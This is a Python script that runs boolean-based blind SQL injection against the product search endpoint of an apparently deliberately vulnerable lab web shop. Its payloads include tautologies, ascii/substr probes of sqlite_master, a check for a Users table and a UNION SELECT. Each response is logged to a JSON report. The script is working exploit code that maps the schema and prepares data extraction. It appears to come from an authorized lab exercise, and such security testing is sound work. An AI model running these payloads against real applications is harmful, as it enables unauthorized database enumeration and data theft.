#!/usr/bin/env python3
"""Boolean-based SQL extraction attempts on /rest/products/search?q=.
Uses the deduced query: WHERE name LIKE '%' || <q> || '%'
True branch → many rows; false branch → zero rows."""
import json, sys, urllib.request, urllib.error

TARGET = "http://lab-mutator:3000"
OUT = sys.argv[1] if len(sys.argv) > 1 else "/workspace/reports/sqli_extract.json"

def req(path):
    r = urllib.request.Request(TARGET + path,
        headers={"User-Agent": "Mozilla/5.0"})
    try:
        with urllib.request.urlopen(r, timeout=15) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read().decode("utf-8", "replace")
        except Exception:
            return e.code, ""

tests = [
    ("base q=Apple", "/rest/products/search?q=Apple"),
    ("true-1: ' OR '1'='1", "/rest/products/search?q=%27%20OR%20%271%27=%271"),
    ("false: ' OR 1=2", "/rest/products/search?q=%27%20OR%201=2"),
    ("extract: first char of sqlite_master.sql > 50 (should be true→all)",
     "/rest/products/search?q=%27%20OR%20ascii(substr((SELECT%20sql%20FROM%20sqlite_master%20LIMIT%201),1,1))>50/**/"),
    ("extract: table count > 5",
     "/rest/products/search?q=%27%20OR%20(SELECT%20count(*)%20FROM%20sqlite_master%20WHERE%20type='table')>5/**/"),
    ("extract: 'users' table exists",
     "/rest/products/search?q=%27%20OR%20(SELECT%20count(*)%20FROM%20sqlite_master%20WHERE%20name='Users')>0/**/"),
    ("extract: first table name starts with 'U'",
     "/rest/products/search?q=%27%20OR%20ascii(substr((SELECT%20name%20FROM%20sqlite_master%20WHERE%20type='table'%20LIMIT%201),1,1))=85/**/"),
    ("extract: product count > 20",
     "/rest/products/search?q=%27%20OR%20(SELECT%20count(*)%20FROM%20Products)>20/**/"),
    ("extract: count of names starting with A > 5",
     "/rest/products/search?q=%27%20OR%20(SELECT%20count(*)%20FROM%20Products%20WHERE%20name%20LIKE%27A%25%27)>5/**/"),
    ("union attempt: ' UNION SELECT 1,2,3,4 FROM sqlite_master--",
     "/rest/products/search?q=%27%20UNION%20SELECT%201,2,3,4%20FROM%20sqlite_master--%2F%2A"),
]
out = []
for name, path in tests:
    st, b = req(path)
    if isinstance(b, str) and (b.startswith("{") or b.startswith("<html")):
        blen = len(b)
    else:
        blen = len(str(b))
    out.append({"test": name, "path": path, "status": st, "body_length": blen, "preview": (b[:200] if isinstance(b, str) else str(b)[:200]).replace("\n", " ")})
    print(f"{name}: status={st} body_length={blen}")

with open(OUT, "w") as f:
    json.dump(out, f, indent=1)
print(f"Wrote {OUT}", file=sys.stderr)
